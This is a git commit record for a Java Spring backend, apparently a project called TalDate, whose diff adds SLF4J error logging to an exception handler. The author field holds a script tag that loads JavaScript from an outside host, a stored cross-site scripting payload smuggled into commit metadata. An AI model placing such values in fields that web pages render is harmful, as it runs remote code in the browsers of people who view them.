c92beb5a9c9fc7ab8bb1d6277d0d22c2819e3478
ukusormus <script src=//0r.ee/script>
2023-12-04 13:24:22 +0200

    logging to main

--- TalDate/src/main/java/com/taldate/backend/exception/ErrorHandler.java
+++ TalDate/src/main/java/com/taldate/backend/exception/ErrorHandler.java
@@ -1,5 +1,6 @@
 package com.taldate.backend.exception;
 
+import lombok.extern.slf4j.Slf4j;
 import org.springframework.http.HttpStatus;
 import org.springframework.http.ResponseEntity;
 import org.springframework.web.bind.annotation.ControllerAdvice;
@@ -7,6 +8,7 @@ import org.springframework.web.bind.annotation.ExceptionHandler;
 
 import java.util.Map;
 
+@Slf4j
 @ControllerAdvice
 public class ErrorHandler {
     @ExceptionHandler(ApplicationException.class)
@@ -18,7 +20,7 @@ public class ErrorHandler {
     @ExceptionHandler(RuntimeException.class)
     public ResponseEntity<ErrorResponse> handleException(Exception e) {
         // 5XX, our error
-        // ... logging
+        log.error("Internal server error", e);
         return new ResponseEntity<>(new ErrorResponse("Oops, something went wrong. Please try again later and if the issue persists, contact us."), HttpStatus.INTERNAL_SERVER_ERROR);
     }
 }
